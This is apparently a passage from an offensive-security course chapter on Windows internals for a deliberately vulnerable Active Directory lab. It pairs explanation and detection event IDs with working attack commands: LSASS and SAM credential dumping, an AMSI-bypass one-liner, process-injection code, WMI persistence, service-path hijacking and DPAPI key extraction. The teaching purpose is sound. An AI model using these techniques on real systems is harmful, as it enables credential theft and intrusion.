DVAD ships at least one of each path (DCSync via `doctor.strange`, IFM via a Server Operators member, robocopy via Backup Operators) — read CRED-007/CRED-013/CRED-014 in PLAN.md.

---

## 2.9 LSASS — credential RAM

`lsass.exe` is the userland process that handles all authentication. While a user is interactively logged on, LSASS holds:

- **NT hash** of the password (for SSO without re-prompt).
- **Kerberos TGT and any service tickets** acquired this session.
- **DPAPI master keys** unsealed for the session.
- **Sometimes plaintexts:** if WDigest is enabled (legacy/`HKLM\SYSTEM\CCS\Control\SecurityProviders\WDigest\UseLogonCredential=1`), Kerberos PKINIT smartcards, RDP-with-CredSSP delegation, or in-memory tspkg/livessp packages.

### Mimikatz mental model

Mimikatz reads LSASS memory and decrypts the AuthSession structures using process-local AES/3DES keys also resident in LSASS. The classic incantation:

```
PS> Invoke-Mimikatz "privilege::debug" "sekurlsa::logonpasswords" "exit"

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1234567 (00000000:0012d687)
Session           : Interactive from 1
User Name         : peter.parker
Domain            : CORP
Logon Server      : DC01
Logon Time        : 2026-05-21 09:12:33
SID               : S-1-5-21-1234567890-1234567890-1234567890-1109
        msv :
         [00000003] Primary
         * Username : peter.parker
         * Domain   : CORP
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : ...
        tspkg :
        wdigest :
         * Username : peter.parker
         * Domain   : CORP
         * Password : (null)         <-- empty because WDigest not enabled
        kerberos :
         * Username : peter.parker
         * Domain   : CORP.LOCAL
         * Password : (null)
```

### Dumping LSASS — modern catalogue

| Method | Notes |
|---|---|
| `procdump.exe -ma lsass.exe lsass.dmp` | Sysinternals; signed; Defender flags reads of lsass |
| `comsvcs.dll MiniDump` via `rundll32.exe` | LoLBin: `rundll32 C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Users\Public\out.dmp full` |
| `nanodump` | Tiny custom dumper; bypasses naïve YARA |
| `mimikatz sekurlsa::minidump` then `sekurlsa::logonpasswords` | offline parse |
| MDE / Defender LSA Protection trip | RunAsPPL blocks unsigned readers |
| `ProcessExplorer.exe -> Create dump` | when interactive |
| Direct syscall (`NtReadVirtualMemory`) bypassing API hooks | EDR-evasion tradecraft |

### Defenses (DVAD does NOT enable these)

- **LSA Protection (`HKLM\SYSTEM\CCS\Control\Lsa\RunAsPPL=1`)**. Makes lsass.exe a Protected Process Light.
- **Credential Guard.** VBS (Virtualization-Based Security) isolates LSA secrets in a separate VTL1 process (`LsaIso.exe`); even SYSTEM in VTL0 cannot read them.
- **Defender ASR rule "Block credential stealing from the Windows local security authority subsystem"** — heuristic block on `OpenProcess(lsass, PROCESS_VM_READ)` from non-allowlisted callers.

---

## 2.10 SMB and named pipes

**SMB (Server Message Block)** is Windows' file-and-pipe protocol, evolved into SMB2 (Vista) and SMB3 (Windows 8/Server 2012).

### Versions

| Version | Released | Notes |
|---|---|---|
| SMB1 (CIFS) | 1996 | EternalBlue surface; disable in production. DVAD enables it for legacy share semantics |
| SMB2.0/2.1 | 2006/2009 | Modern baseline |
| SMB3.0 | 2012 | AES-CCM encryption, signing default for DC sessions |
| SMB3.1.1 | 2015 | AES-GCM, pre-auth integrity (defeats downgrade) |

DVAD enables SMB1 on at least one host (file01) to support a "legacy share" attack (IA-018-ish).

### Three things SMB carries

1. **File shares** — `\\fileserver\share\file.txt`. Reads, writes, opens, locks, oplocks.
2. **Named pipes** — `\\server\pipe\spoolss`. Bidirectional byte stream; used as transport for many RPC interfaces.
3. **DCERPC transport** — `ncacn_np:server[\\pipe\\name]` — Microsoft RPC over named pipes over SMB.

### Important named pipes

| Pipe | RPC interface (UUID) | What it does | DVAD relevance |
|---|---|---|---|
| `\samr` | `12345778-1234-abcd-ef00-0123456789ac` | SAM management | RID cycling, password reset (`SamrSetInformationUser`) |
| `\lsarpc` | `12345778-1234-abcd-ef00-0123456789ab` | LSA | SID lookups, trust enumeration |
| `\netlogon` | `12345678-1234-abcd-ef00-01234567cffb` | Netlogon (MS-NRPC) | **ZeroLogon target** |
| `\spoolss` | `12345678-1234-abcd-ef00-0123456789ab` | Print Spooler (MS-RPRN) | **PrinterBug coercion** |
| `\efsrpc` | `df1941c5-fe89-4e79-bf10-463657acf44d` | EFS RPC (MS-EFSR) | **PetitPotam coercion** |
| `\srvsvc` | `4b324fc8-1670-01d3-1278-5a47bf6ee188` | Server Service | share enum |
| `\wkssvc` | `6bffd098-a112-3610-9833-46c3f87e345a` | Workstation Service | session enum (NetSessionEnum) |
| `\atsvc` | `1ff70682-0a51-30e8-076d-740be8cee98b` | Task Scheduler | `atexec.py` |
| `\winreg` | `338cd001-2244-31f1-aaaa-900038001003` | Remote Registry | `reg save \\host` |
| `\ntsvcs` | `367abb81-9844-35f1-ad32-98f038001003` | Service Control Manager | `psexec`, `sc.exe \\host` |
| `\eventlog` | `f6beaff7-1e19-4fbb-9f8f-b89e2018337c` | EventLog | remote log read |
| `\drsuapi` (TCP, not pipe) | `e3514235-4b06-11d1-ab04-00c04fc2dcd2` | Directory Replication | **DCSync** |

`enum4linux-ng` / `nxc smb --pass-pol` and `impacket-rpcdump` enumerate these.

### Null sessions and RID cycling

A **null session** is an SMB connection with empty credentials. Historically, this was allowed and many RPC interfaces (especially SAMR) were accessible. Modern Windows restricts:

- `HKLM\SYSTEM\CCS\Control\Lsa\RestrictAnonymous=1` blocks anonymous LSARPC enumeration.
- `RestrictAnonymousSAM=1` blocks SAMR enumeration.

DVAD on DCs leaves `RestrictAnonymous=0` (default) and the `Pre-Windows 2000 Compatible Access` group includes `Anonymous Logon` — enabling RID cycling via `impacket-lookupsid`.

---

## 2.11 The Service Control Manager

Services are background processes managed by **services.exe** (the SCM). Each service has:

- **ServiceName** (`Spooler`, `WinRM`) — short name.
- **DisplayName** — friendly label.
- **ImagePath** — EXE to run; may include arguments.
- **StartType** — Boot (0) / System (1) / Auto (2) / Manual (3) / Disabled (4).
- **ServiceType** — own process / share process / kernel driver / fs driver / user own.
- **ObjectName** — run-as account: `LocalSystem`, `LocalService`, `NetworkService`, or `DOMAIN\acct`.
- **Required privileges** — explicit privilege list.
- **Security descriptor** (the SC SD) — who can SC_MANAGER_CONNECT, SERVICE_START, SERVICE_STOP, SERVICE_CHANGE_CONFIG, READ_CONTROL, WRITE_DAC...

### Why services are an attacker prize

A service running as SYSTEM provides a path to SYSTEM-level code execution if any of the following is true:

| Misconfig | Class |
|---|---|
| `ImagePath` points to a path I can overwrite | PE-005 (DLL/EXE hijack) |
| `ImagePath` is unquoted with spaces | PE-006 (unquoted service path) |
| The service binary's directory is writable | PE-007 (dir hijack) |
| The service loads a DLL by relative path | PE-008 (DLL search-order) |
| The service config has weak `WRITE_DAC` or `CHANGE_CONFIG` SD | PE-009 |
| The registry key `HKLM\…\Services\<svc>` is writable by me | PE-010 |

### PsExec workflow (mental model)

```
1. Attacker opens \\target\ADMIN$ over SMB with admin creds.
2. Uploads `PSEXESVC.exe` (or random name) to ADMIN$\.
3. Connects to \\target\pipe\svcctl (Service Control Manager RPC).
4. SvcCtl.CreateService with ImagePath=that path, StartType=demand.
5. SvcCtl.StartService.
6. The service opens 3 named pipes: stdin, stdout, stderr.
7. Attacker connects to those pipes and reads/writes.
8. On disconnect, attacker SvcCtl.DeleteService and SMB deletes the EXE.
```

That entire flow leaves: an SMB session, an `ADMIN$` file write (4663/5145), a service create (7045), a service start (7036), and a service stop/delete (7034/7036). Hence "PsExec is loud."

`wmiexec.py` skips the service step — uses Win32_Process.Create over DCOM. `dcomexec.py` uses MMC20.Application or similar. `atexec.py` uses Task Scheduler RPC.

### Service config commands

```
PS> sc.exe qc Spooler
PS> sc.exe sdshow Spooler
PS> sc.exe config Spooler binPath= "C:\evil.exe"
PS> sc.exe config Spooler obj= LocalSystem password= ""
PS> sc.exe start Spooler
PS> sc.exe failure Spooler reset= 0 actions= restart/0
PS> Get-Service Spooler | Select-Object Name,Status,StartType,ServiceType
```

Note: `sc.exe config` requires a space *after* the `=` sign. `binPath=evil.exe` will silently fail to update.

---

## 2.12 Windows logon types

Every authentication has a *logon type* that LSA records. This shapes how secrets are cached and how the auth was performed.

| Type | Code | When |
|---|---|---|
| Interactive | 2 | Sitting at the console keyboard |
| Network | 3 | SMB share, RPC, WinRM (NTLM/Kerberos auth, no cred caching) |
| Batch | 4 | Scheduled task / job runs |
| Service | 5 | A service starts as a named principal |
| Unlock | 7 | Unlocking a screensaver |
| NetworkCleartext | 8 | Plaintext password over network (Basic auth, IIS, LDAP simple bind) |
| NewCredentials | 9 | `runas /netnly` — sticky alt creds for outbound only |
| RemoteInteractive | 10 | RDP / Remote Desktop |
| CachedInteractive | 11 | Cached domain logon when DC unreachable |
| CachedRemoteInteractive | 12 | RDP using cached domain logon |
| CachedUnlock | 13 | Cached screen unlock |

### Implications for LSASS dumping

- **Types 2, 10, 11, 12** populate LSASS with sufficient material to re-auth (NT hash, often Kerberos tickets, sometimes plaintext via WDigest/CredSSP).
- **Type 3 (Network)** uses challenge/response NTLM or Kerberos ticket exchange; the *result* is short-lived and **does not cache the user's NT hash** on the server. So if you LSASS-dump a file server that ten thousand users `net use`d, you'll get nothing for them.
- **Type 5 (Service)** caches the service's own credentials.
- **Type 9 (`runas /netonly`)** stores cleartext password in LSASS for outbound auth only.

This is why "hunt for an admin's RDP session and dump LSASS there" is a high-value lateral pattern (LAT-016 in PLAN.md).

---

## 2.13 UAC and the token split

When an admin user (member of BUILTIN\Administrators / Domain Admins) logs on, LSA creates **two tokens**:

- **Full token** — all admin SIDs/privileges.
- **Filtered token** — same SIDs but the admin group SID is `USE_FOR_DENY_ONLY` and most Se* privileges are stripped.

The Windows shell (`explorer.exe`) runs with the filtered token. Elevation prompts (`consent.exe`, "Yes/No" dialog) switch to the full token. The filtered+full pair is called the **linked token**.

### UAC remote restrictions

For network logons (type 3) of a non-built-in admin (RID ≠ 500), only the *filtered* token is returned. This kills "PsExec as a non-RID-500 local admin" by default. Two opt-outs:

1. `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy=1` — disables the filter for *all* local accounts.
2. `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken=0` — disables it specifically for RID 500 (in case it was enabled).

DVAD sets `LocalAccountTokenFilterPolicy=1` on member servers (so lateral with a non-RID-500 local admin works). PE-???/LAT-??? exercises rely on this.

### UAC bypass surface

Many UAC bypasses exist (Fodhelper, ComputerDefaults, EventVwr, sdclt, slui, etc.), all relying on auto-elevating signed binaries that read attacker-controlled inputs. DVAD doesn't require you to chain UAC bypasses — local admin in the lab is straight-shot.

---

## 2.14 Windows event logs

Two storage locations:

- `%SystemRoot%\System32\winevt\Logs\Security.evtx` — Security log (canonical authn/authz).
- Application/System/Setup/ForwardedEvents/Operational channels under `Microsoft-Windows-*`.

### Channels you will care about

| Channel | Why |
|---|---|
| `Security` | 4624/4625/4768/4769/4776/4688/4698/4720… |
| `System` | 7045/7034/7036 (service control), 1102 (log cleared) |
| `Microsoft-Windows-PowerShell/Operational` | PS script-block logging (4104) |
| `Windows PowerShell` | Older PS engine events (400, 800) |
| `Microsoft-Windows-Sysmon/Operational` | If Sysmon installed |
| `Microsoft-Windows-CertificationAuthority/Operational` | ADCS request/issuance (4886/4887) |
| `Microsoft-Windows-NTLM/Operational` | NTLM auths attempted/restricted (8001/8002/8003) |
| `Microsoft-Windows-Kerberos-Key-Distribution-Center/Operational` | Kerberos KDC errors |
| `Microsoft-Windows-Bits-Client/Operational` | BITS jobs (a common LoLBin) |
| `Microsoft-Windows-LSA/Operational` | LSA package loads |
| `Directory Service` | AD object changes (5136), replication |

### Event IDs you must memorize

| EID | Channel | Meaning |
|---|---|---|
| 4624 | Security | Logon success (LogonType field tells you which type) |
| 4625 | Security | Logon failure |
| 4634/4647 | Security | Logoff |
| 4648 | Security | Logon with explicit credentials (`runas`, `runas /netonly`) |
| 4672 | Security | "Special privileges assigned" — admin login |
| 4688 | Security | Process creation (cmdline if SACL'd) |
| 4697 | Security | Service installed (alt to 7045) |
| 4698 | Security | Scheduled task created |
| 4720 | Security | User account created |
| 4722 | Security | User enabled |
| 4724 | Security | Password reset attempt |
| 4728 | Security | Member added to security-enabled global group |
| 4732 | Security | Member added to security-enabled local group |
| 4738 | Security | User account changed |
| 4740 | Security | User account locked out |
| 4741 | Security | Computer account created |
| 4742 | Security | Computer account changed (**ZeroLogon** signal) |
| 4768 | Security (DC) | Kerberos TGT issued (AS-REQ) |
| 4769 | Security (DC) | Kerberos service ticket issued (TGS-REQ) — **Kerberoast** signal |
| 4770 | Security (DC) | Service ticket renewed |
| 4771 | Security (DC) | Pre-authentication failed (**AS-REP-roast** when PreAuth=0) |
| 4776 | Security (DC) | NTLM credential validated |
| 4781 | Security | Account renamed |
| 4798 | Security | A user's local group membership was enumerated (good signal!) |
| 4886/4887 | CA/Op | ADCS cert request / issuance |
| 5136 | Security (DC) | Directory service object modified |
| 5137 | Security (DC) | DS object created |
| 5140 | Security | Network share accessed |
| 5145 | Security | Detailed file share access (file-level) |
| 7034 | System | Service crashed |
| 7036 | System | Service state change |
| 7040 | System | Service start type changed |
| 7045 | System | Service installed |
| 1102 | Security | **Security log cleared** |

Sysmon event IDs (separate channel) layer on top: 1 process create, 3 network connect, 7 image load, 8 CreateRemoteThread, 10 ProcessAccess, 11 FileCreate, 13 RegistryValueSet, 22 DNS query.

We'll come back to detection writing in Chapter 13.

---

## 2.15 Filesystem paths to know

| Path | What |
|---|---|
| `C:\Windows\System32` | 64-bit binaries on 64-bit OS (yes, the naming is confusing) |
| `C:\Windows\SysWOW64` | 32-bit binaries on 64-bit OS |
| `C:\Windows\NTDS\ntds.dit` | AD database (DCs only) |
| `C:\Windows\System32\config\` | Registry hive files |
| `C:\Windows\System32\config\RegBack\` | Stale hive backup (sometimes world-readable!) |
| `C:\Windows\SYSVOL\sysvol\<domain>\Policies\` | GPO content; replicates to all DCs |
| `C:\Windows\SYSVOL\sysvol\<domain>\scripts\` | NETLOGON share content |
| `C:\Windows\Tasks\` and `C:\Windows\System32\Tasks\` | Scheduled task XML |
| `C:\Users\<u>\AppData\Local\Microsoft\Credentials\` | DPAPI credential blobs (saved logons) |
| `C:\Users\<u>\AppData\Roaming\Microsoft\Protect\<SID>\` | DPAPI master keys (encrypted with logon password / domain backup key) |
| `C:\Users\<u>\AppData\Roaming\Microsoft\Vault\` | Web/cred vault |
| `C:\Program Files\` / `C:\Program Files (x86)\` | Installed apps |
| `C:\ProgramData\` | App data shared between users (often forgotten ACLs) |
| `C:\inetpub\` | IIS root (if installed) |
| `C:\$Recycle.Bin` | Recycle bin (deleted files) |
| `C:\PerfLogs` | Perf counters; sometimes used as drop site by attackers |
| `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>` | VSS snapshot access |

### Special paths

- **`ADMIN$`** — admin share, mapped to `C:\Windows`. Required for PsExec / SMB lateral.
- **`C$`, `D$`, ...** — drive admin shares.
- **`IPC$`** — interprocess communication share (named pipes). The thing null-session enumeration targets.
- **`NETLOGON`** — domain-scoped logon scripts, replicated.
- **`SYSVOL`** — domain-scoped GPO container, replicated. Search for `groups.xml`, `services.xml`, `scheduledtasks.xml` here — they used to contain encrypted-but-decryptable passwords (`cpassword`, CVE-2014-1812). DVAD seeds a SYSVOL cpassword in one place — that's CRED-006.

```bash
# Grep SYSVOL for cpassword (mounted via SMB)
smbclient.py corp.local/peter.parker:DVADlab2024@10.10.0.10 \\SYSVOL
# or mount over SMB and use ripgrep
mount -t cifs //10.10.0.10/SYSVOL /mnt/sysvol -o username=peter.parker,password='DVADlab2024!'
rg -i cpassword /mnt/sysvol/
```

---

## 2.16 Process injection — a glimpse

Many post-ex techniques inject code into a remote process to inherit its identity/privileges or to hide:

```c
HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, victimPid);
LPVOID p = VirtualAllocEx(h, NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(h, p, shellcode, len, NULL);
CreateRemoteThread(h, NULL, 0, p, NULL, 0, NULL);
```

Variants: reflective DLL, manual mapping, process hollowing (CreateProcess SUSPENDED → NtUnmapViewOfSection → WriteProcessMemory → ResumeThread), early-bird APC injection, thread hijack (SetThreadContext to point RIP at attacker-allocated page).

EDRs hook those API names (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`); modern offensive tradecraft uses direct syscalls or indirect syscalls (via legitimate gadget addresses inside `ntdll`).

DVAD doesn't require you to write injectors. But when you read mimikatz, Cobalt Strike, or Sliver source, you'll meet these primitives.

---

## 2.17 WMI — the management plane

**WMI (Windows Management Instrumentation)** is the Microsoft implementation of CIM/WBEM: a management API exposing thousands of classes (Win32_Process, Win32_Service, Win32_UserAccount, ...). It is the *single most-used remote management interface on Windows after PowerShell*, and it's a common lateral movement transport.

### Architecture

```
+----------------------+      DCOM      +----------------------+
| WMI Consumer (you)   |  <-----------> | WMI Provider Host    |
|  - Win32 client      |     RPC        | (wmiprvse.exe) on   |
|  - PS Get-CimInstance|                 |  target              |
+----------------------+                 +----------------------+
                                                  |
                                                  v
                                          Repository (CIMV2)
```

### Common WMI calls

```
# Local
PS> Get-CimInstance Win32_Process | Where-Object Name -eq 'lsass.exe'
PS> Get-CimInstance Win32_Service | Where-Object State -eq 'Running'
PS> Get-CimInstance Win32_OperatingSystem | Select-Object Caption,OSArchitecture,Version,BuildNumber

# Remote
PS> Get-CimInstance Win32_Process -ComputerName ws01 -Credential (Get-Credential)

# Create a process remotely (this is what wmiexec.py does)
PS> Invoke-WmiMethod -ComputerName ws01 -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\Users\Public\out.txt"
```

### WMI Event Subscription persistence (PER-002)

You can register an event filter (e.g., "every 60 seconds") and a consumer (e.g., "run this script") with a binding. Result: persistent code execution as SYSTEM, no service or scheduled task on disk. Tools: `mofcomp`, `Set-WmiInstance`.

```
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "EvilFilter"; EventNamespace = "root\cimv2"; QueryLanguage="WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "EvilConsumer"; ExecutablePath = "C:\Windows\System32\cmd.exe"; CommandLineTemplate = "/c calc.exe"
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter; Consumer = $Consumer
}
```

Detection: Sysmon event IDs 19/20/21 record WMI subscription create/delete.

---

## 2.18 PowerShell as a Windows component

PowerShell is not a third-party tool — it's part of Windows. There are two engines now:

- **Windows PowerShell 5.1** — `powershell.exe`, ships in-box, .NET Framework, last legacy release.
- **PowerShell 7.x** — `pwsh.exe`, separate install, .NET 6/7/8.

DVAD targets PS 5.1 (preinstalled on Server 2022).

### Security features (and how attackers bypass them)

| Feature | What | Bypass |
|---|---|---|
| Execution Policy | Restricted/AllSigned/RemoteSigned/Unrestricted/Bypass | `-ExecutionPolicy Bypass`, `IEX (New-Object Net.WebClient).DownloadString(...)`, `-EncodedCommand` |
| Constrained Language Mode | restricts .NET types, COM, Add-Type | escape via `runspace` invoking from FullLanguage, or downgrade via PS 2 (`powershell -Version 2`) — closed in modern by removing PS 2 engine |
| AMSI (Antimalware Scan Interface) | scans script content before exec | `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` (patched, but variants exist) |
| Script Block Logging (4104) | records script blocks pre-exec | Defeated only by EDR-blind, not by user-side trickery |
| Module Logging (4103) | records pipeline calls | same |
| Transcription | per-session transcript file | same |

DVAD doesn't enable AMSI or PS logging on member servers by default. They are enabled on `ws01` to teach you what tripping them looks like.

Detailed PS coverage is in chapter 03.

---

## 2.19 Scheduled tasks

A scheduled task is XML (`%WINDIR%\System32\Tasks\<TaskName>`) plus a registry entry (`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}`).

```
PS> Get-ScheduledTask | Format-Table TaskName,State,Author
PS> Get-ScheduledTask -TaskName "EvilTask" | Get-ScheduledTaskInfo
PS> Register-ScheduledTask -TaskName "EvilTask" -Action (New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c calc.exe") -Trigger (New-ScheduledTaskTrigger -AtLogOn) -RunLevel Highest -User SYSTEM
```

Offensive uses:

- **Lateral movement** — `atexec.py` registers a task as SYSTEM on a remote host.
- **Persistence** — `\Microsoft\Windows\<random>\<TaskName>` blends with built-in tasks.
- **Privilege escalation** — find a task running as SYSTEM whose script/binary is writable by you.

```
PS> Get-ScheduledTask | ForEach-Object {
    $a = $_.Actions | Where-Object { $_.Execute }
    [pscustomobject]@{ Name = $_.TaskName; Path = $_.TaskPath; User = $_.Principal.UserId; Exec = $a.Execute }
} | Where-Object { $_.User -match 'SYSTEM' }
```

Event 4698 fires on task creation. DVAD plants at least one weakly-ACL'd scheduled task on `ws01` — that's a PE-flag.

---

## 2.20 The Windows network stack from the OS side

You learned the network in chapter 01. From the Windows side, a few additional facts:

### NetBIOS and friends

- **NetBIOS over TCP/IP (NBT)** runs on UDP 137 (Name Service), UDP 138 (Datagram), TCP 139 (Session). Predates DNS as universal name resolution.
- **LLMNR** (UDP 5355) was added in Vista to replace NBT-NS for IPv6/peer networks. Same poisoning surface.
- **mDNS** (UDP 5353) — Bonjour-style; Windows 10+ joins in.
- **WPAD** — Web Proxy Auto-Discovery. Looks up `wpad.<domain>` over DNS, then DHCP option 252, then NetBIOS. If unresolved at DNS but resolvable over NetBIOS/LLMNR → attacker serves `wpad.dat` → HTTP NTLM auth → relay.

Disable LLMNR/NBT-NS via GPO. DVAD leaves them enabled (IA-001..IA-005 family relies on this).

### Firewall

`netsh advfirewall` / `Get-NetFirewallRule` / `New-NetFirewallRule`. Each rule has direction, protocol, port, program, profile (Domain/Private/Public). DVAD's `post-install.ps1` disables the firewall on all member servers for lab simplicity — a real-world unicorn. Production hosts must enforce profiles.

### IPv6

Enabled by default. SLAAC autoconfig + DHCPv6 stateful. **mitm6** advertises a malicious DHCPv6 server, becomes the IPv6 DNS for all Windows hosts, then proxies their DNS queries — pairs with `ntlmrelayx -6 -wh wpad ...` to harvest NTLM auth (IA-007).

To disable IPv6 on the *attacker's Kali box* (rarely needed; mitm6 needs it on victims, not you):

```
sysctl -w net.ipv6.conf.all.disable_ipv6=1
```

On Windows targets: `Set-NetAdapterBinding -Name "Ethernet" -ComponentID ms_tcpip6 -Enabled $false` (requires admin).

---

## 2.21 DPAPI — the OS credential vault

**DPAPI (Data Protection API)** is Windows' built-in user-and-machine-scoped crypto blob format. Saved Wi-Fi passwords, browser saved passwords (legacy), RDP saved creds, Chrome cookies, vault items — all DPAPI.

### Conceptual flow

```
Plaintext --DPAPI Protect--> Encrypted Blob (per-user master key)
                                 ^
                                 |
Master key derived from user logon password
   (or domain DPAPI backup key for domain users)
```

When a user authenticates interactively, LSA derives the user's master key from their password and stores it in their profile. Protected blobs ("CREDENTIAL", "RDG", "VAULT") on disk can only be decrypted with that key.

**Domain backup keys.** Domain-joined users have a fallback: the *Domain DPAPI master key* (stored in NTDS on each DC, replicated). With Domain Admin + access to a DC, you can extract this and decrypt any user's DPAPI blob without their password.

```bash
# Extract domain backup key
impacket-dpapi backupkeys --target dc01.corp.local -u Administrator -p 'pass'

# Decrypt a master key with the backup key
impacket-dpapi masterkey -file <user-mkfile> -pvk backup.pvk

# Decrypt a credential blob
impacket-dpapi credential -file <credfile> -key <decoded mk hex>
```

DVAD plants a DPAPI-protected credential on `file01` (CRED-024 in PLAN.md — read the file there for exact location).

---

## 2.22 PE files, signatures, AppLocker/WDAC

### PE format basics

A PE (Portable Executable) file (`.exe`, `.dll`, `.sys`) has:

- DOS header (`MZ`) + DOS stub.
- NT headers: file header (machine, num sections), optional header (entry point, image base, subsystem).
- Section headers (.text, .data, .rdata, .rsrc, .reloc, etc.).
- Sections themselves.
- Import table (DLLs and functions used).
- Export table (functions provided, if a DLL).
- Resource table (icons, manifests, version info).
- Optional: digital signature certificate (embedded in `IMAGE_DIRECTORY_ENTRY_SECURITY`).

`signtool verify /pa file.exe` checks signatures. PowerShell: `Get-AuthenticodeSignature .\file.exe`.

### AppLocker / WDAC

**AppLocker** is a path/publisher/hash allowlist enforced by `AppIDSvc`. **WDAC (Windows Defender Application Control)** is its successor — kernel-enforced via Code Integrity. Bypasses:

- AppLocker bypass via signed Microsoft binaries (LoLBins) that load attacker DLLs (msbuild.exe, installutil.exe, regsvr32.exe with scrobj.dll, mshta.exe, etc.).
- WDAC bypass: harder; relies on unfixed audit-only rules, signed renamed binaries, or kernel exploits.

DVAD doesn't enforce AppLocker/WDAC. The "LoLBin" category still matters for *evasion* but not bypass.

---

## 2.23 Putting it together — a privesc chain on file01

To anchor everything, here's a worked microexample tying these pieces together. (You'll do the full one in lab 11.A.)

**Goal:** as `peter.parker` (a Domain User) with WinRM access to `file01`, escalate to SYSTEM on file01.

1. `peter.parker` lands via WinRM. `whoami /priv` shows no privileges other than `SeChangeNotifyPrivilege`.
2. Enumerate services: `Get-CimInstance Win32_Service | Where-Object StartMode -eq 'Auto'`. One service `BackupRunner` runs as SYSTEM with `PathName` = `C:\Tools\backup.exe`.
3. `icacls C:\Tools\backup.exe` shows `BUILTIN\Users:(M)` — modify rights. Score.
4. Replace `backup.exe` with a copy that calls `net localgroup Administrators peter.parker /add`.
5. Restart the service: `Restart-Service BackupRunner`.
6. `whoami /groups` now includes `BUILTIN\Administrators`. Logout/login or grab a new WinRM session.
7. As local admin, `reg save HKLM\SAM`, `reg save HKLM\SYSTEM`, exfil, `secretsdump LOCAL` — local NT hashes.
8. The local Administrator's NT hash matches **the same on sql01** (shared local-admin password). Pivot: `nxc smb 10.10.0.14 -u Administrator -H <NT> --local-auth`.

That chain touched: tokens (1), privileges (2), services (3, 5), ACLs (3), the SAM (7), and lateral movement (8). All the chapter-02 mechanics in one flow.

---

## Lab exercises

> **Prereq:** You have credentials for `peter.parker` (Domain User). Compromise enough to drop into a shell on `ws01.corp.local` (10.10.0.100) or `file01` (10.10.0.13). Easiest path:
>
> ```bash
> evil-winrm -i 10.10.0.100 -u peter.parker -p 'DVADlab2024!'
> # if access denied on ws01:
> evil-winrm -i 10.10.0.13 -u peter.parker -p 'DVADlab2024!'
> ```

### Exercise 2.A — Walk your token

```
*Evil-WinRM* PS> whoami /all
*Evil-WinRM* PS> whoami /priv
*Evil-WinRM* PS> whoami /groups
```

Identify:
- Your user SID.
- The domain SID prefix (everything before the final RID).
- Group memberships.
- Which privileges are listed and whether they're Enabled or Disabled.

Q: which RID identifies Domain Admins? Use that to compute the full Domain Admins SID for your domain. Verify with `Get-ADGroup "Domain Admins"` (RSAT) or:

```
*Evil-WinRM* PS> ([System.Security.Principal.NTAccount]"CORP\Domain Admins").Translate([System.Security.Principal.SecurityIdentifier]).Value
```

### Exercise 2.B — Inspect the registry for ZeroLogon flag

```
*Evil-WinRM* PS> Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters' |
                    Select-Object FullSecureChannelProtection
```

If the value is `0` (or absent), the host is vulnerable to ZeroLogon if it's also a DC. `ws01` isn't a DC so this is informational; but the lab DC `dc01.corp.local` *is* and *is* vulnerable. (Don't fire the exploit until you've done chapter 10. Just record the registry state.)

### Exercise 2.C — Dump local SAM (only if you have admin on a member server)

If you have local admin via a PE chain, demonstrate the dump:

```
*Evil-WinRM* PS> reg save HKLM\SAM C:\Users\Public\sam.save
*Evil-WinRM* PS> reg save HKLM\SYSTEM C:\Users\Public\system.save
*Evil-WinRM* PS> download sam.save
*Evil-WinRM* PS> download system.save
```

Then on Kali:

```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

You should see a line ending in `:c5a237b7e9d8e708d8436b6148a25fa1:::` (or similar) for the local Administrator. Crack it (chapter 10) or pass it (chapter 11).

### Exercise 2.D — Enumerate services with write-by-non-admins

```
*Evil-WinRM* PS> $services = Get-CimInstance Win32_Service
*Evil-WinRM* PS> foreach ($s in $services) {
    if ($s.PathName) {
        $path = ($s.PathName -split '"')[1]
        if (-not $path) { $path = ($s.PathName -split ' ')[0] }
        try {
            $acl = Get-Acl $path -ErrorAction Stop
            foreach ($ace in $acl.Access) {
                if ($ace.IdentityReference -match 'Users|peter.parker|Everyone' -and $ace.FileSystemRights -match 'Write|Modify|FullControl') {
                    "$($s.Name) :: $path :: $($ace.IdentityReference) :: $($ace.FileSystemRights)"
                }
            }
        } catch {}
    }
}
```

Any non-empty output is a privesc primitive. Cross-reference with PLAN.md PE-005..PE-010.

### Exercise 2.E — Find LSASS and check protection

```
*Evil-WinRM* PS> Get-Process lsass
*Evil-WinRM* PS> Get-CimInstance Win32_Service -Filter "Name='lsass'" | Select-Object Name,State,ProcessId
*Evil-WinRM* PS> Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' | Select-Object RunAsPPL
```

If `RunAsPPL` is `1`, LSA Protection is on (mimikatz must load a signed driver). If unset or `0`, LSASS can be dumped with a procdump-style tool from admin context.

### Exercise 2.F — Search SYSVOL for cpassword

From a Kali pivot or with credentials:

```bash
mkdir -p /mnt/sysvol
mount -t cifs //10.10.0.10/SYSVOL /mnt/sysvol -o username=peter.parker,password='DVADlab2024!',vers=3.0
grep -ri "cpassword" /mnt/sysvol/ 2>/dev/null | head
```

Or fully via SMB:

```bash
impacket-smbclient.py corp.local/peter.parker:'DVADlab2024!'@10.10.0.10
use SYSVOL
recurse on
